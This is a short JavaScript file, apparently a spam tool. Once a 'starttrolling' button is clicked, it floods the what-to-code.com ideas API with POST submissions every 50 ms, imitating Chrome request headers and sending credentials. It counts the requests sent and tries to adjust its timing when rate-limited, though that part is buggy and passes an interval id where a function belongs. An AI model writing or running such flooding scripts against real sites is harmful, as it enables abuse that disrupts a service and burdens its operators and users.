const sqs = qs => document.querySelector(qs);

let del = 50, vw = null, i = 0, rl = 1;

const fun = function () {
  fetch("https://what-to-code.com/api/ideas", {
    "headers": {
      "accept": "application/json, text/plain, */*",
      "accept-language": "en-US,en;q=0.9",
      "cache-control": "no-cache",
      "content-type": "application/json;charset=UTF-8",
      "pragma": "no-cache",
      "sec-ch-ua": "\".Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"103\", \"Chromium\";v=\"103\"",
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": "\"Windows\"",
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin"
    },
    "referrer": "https://what-to-code.com/submit",
    "referrerPolicy": "no-referrer-when-downgrade",
    "body": "{\"title\":\""+sqs('#name').value+"\",\"description\":\""+sqs('#description').value+"\",\"tags\":[]}",
    "method": "POST",
    "mode": "no-cors",
    "credentials": "include"
  }).then(function (data) {
    i++;
    sqs('#stat').textContent = 'Currently sent ' + String(i) + ' requests.';
  }).catch(function (error) {
    sqs('#stat').textContent = 'Currently ratelimited. Bumping up execution time...';
    rl++;
    clearInterval(vw);
    setInterval(vw, del * rl)
  });
};

sqs('#starttrolling').addEventListener('click', function () {
  vw = setInterval(fun, del);
});
